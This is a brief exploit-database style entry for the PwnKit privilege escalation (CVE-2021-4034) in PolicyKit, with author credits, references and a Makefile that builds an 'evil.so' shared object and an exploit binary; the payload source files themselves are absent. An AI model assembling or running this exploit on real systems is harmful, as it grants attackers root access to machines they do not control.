# Exploit Title: PolicyKit-1 0.105-31 - Privilege Escalation
# Exploit Author: Lance Biggerstaff
# Original Author: ryaagard (https://github.com/ryaagard)
# Github Repo: https://github.com/ryaagard/CVE-2021-4034
# References: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt

# Description: The exploit consists of three files `Makefile`, `evil-so.c` & `exploit.c`

##### Makefile #####

all:
	gcc -shared -o evil.so -fPIC evil-so.c
	gcc exploit.c -o exploit

clean:
	rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so
